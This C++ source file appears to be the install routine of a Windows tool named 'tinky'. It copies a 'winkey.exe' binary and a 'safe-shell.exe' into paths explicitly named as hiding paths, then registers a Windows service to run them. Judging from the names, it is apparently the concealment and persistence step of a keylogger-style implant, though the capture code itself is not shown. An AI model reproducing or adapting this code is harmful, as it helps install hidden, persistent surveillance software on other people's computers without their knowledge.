#include "tinky.hpp"
#include <iostream>
#include "utils.hpp"

using namespace std;

extern tinky_t tinky;

int openSCM(DWORD desiredAccess) {
	tinky.scmHandler = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, desiredAccess);
	if (!tinky.scmHandler) {
		cerr	<< "Error while accessing Service Control Manager... Error code: " << GetLastError() << "\n";
		return (FAILURE);
	}
	return (SUCCESS);
}

static BYTE createService(void) {
	if (!openSCM(SC_MANAGER_CREATE_SERVICE))
		return (FAILURE);

	tinky.serviceHandler = CreateServiceW(
		tinky.scmHandler,
		SVC_NAME,
		SVC_NAME,
		SC_MANAGER_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL, // should log on error
		getServicePath(SVC_NAME).c_str(),
		NULL, NULL, NULL, NULL, NULL
	);
	if (!tinky.serviceHandler) {
		cerr	<< "Failed to create service... ";
		if (GetLastError() == ERROR_SERVICE_EXISTS)
			cerr	<< "Service tinky already exist";
		cerr	<< "\n";
		return (FAILURE);
	}
	return (SUCCESS);
}

static BYTE movWinkey(void) {
	wstring processPath = getServicePath(L"winkey");

	if (!CopyFileW(
			processPath.c_str(),
			HIDING_PATH,
			FALSE
		)) {

		cerr	<< "Can't move winkey.exe... error code: "<< GetLastError() << "\n"
				<< "Failed to create service...\n"
				<< "\n";

		return (FAILURE);
	}
	return (SUCCESS);
}

static BYTE moveAdditionalProcesses(void) { // TODO cleanup and refactor that shitty mess
	wstring name(L"safe-shell");
	wstring processPath = getServicePath(name);
	wstring genericHidingPath = GEN_HIDING_PATH + name + L".exe";

	wcout	<< L"Shafe shell process path: " << processPath << '\n';
	wcout	<< "Hiding path: " << genericHidingPath << '\n';

	if (!CopyFileW(
			processPath.c_str(),
			genericHidingPath.c_str(),
			FALSE
		)) {

		cerr	<< "Can't move safe-shell.exe... error code: "<< GetLastError() << "\n"
				<< "Failed to create service...\n";

		return (FAILURE);
	}
	return (SUCCESS);
}

int install(void**) {
	cout	<< "Installing service...\n";
	if (!movWinkey())
		return (FAILURE);
	if (!moveAdditionalProcesses())
		return (FAILURE);
	if (!createService())
		return (FAILURE);
	cout	<< "Service installed successfully\n";
	return (SUCCESS);
}